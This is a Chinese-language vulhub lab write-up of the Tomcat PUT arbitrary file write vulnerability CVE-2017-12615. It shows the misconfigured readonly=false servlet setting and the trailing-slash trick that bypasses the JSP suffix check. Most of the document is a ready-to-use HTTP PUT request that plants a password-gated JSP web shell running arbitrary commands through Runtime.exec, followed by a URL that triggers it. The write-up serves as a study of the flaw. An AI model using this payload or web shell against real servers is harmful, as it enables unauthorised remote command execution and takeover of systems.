# 通过PUT方法的Tomcat任意写入文件漏洞（CVE-2017-12615）

###### by ADummy

### 0x00利用路线

​			Burpsuite抓包--->发包--->写入shell--->命令执行

### 0x01漏洞介绍

​				Tomcat设置了写许可权（readonly = false），这导致我们可以将文件写入服务器。

```
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```

尽管Tomcat在某种程度上检查了文件后缀（无法直接编写jsp），但我们仍然可以通过某些文件系统功能（例如`/`在Linux中使用）来绕过该限制。



### 0x02漏洞复现

#### 		payload

```
PUT /1.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b));
        }
        out.print("</pre>");
    }
%>
```

```
http://192.168.68.132:8080/1.jsp?pwd=023&i=ls
```



![Tomcat_PUT方法任意写入文件漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Tomcat_PUT方法任意写入文件漏洞_1.jpg)

![Tomcat_PUT方法任意写入文件漏洞_2](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/Tomcat_PUT方法任意写入文件漏洞_2.jpg)



### 0x03参考资料

https://www.cnblogs.com/qianxiao996/p/13574653.html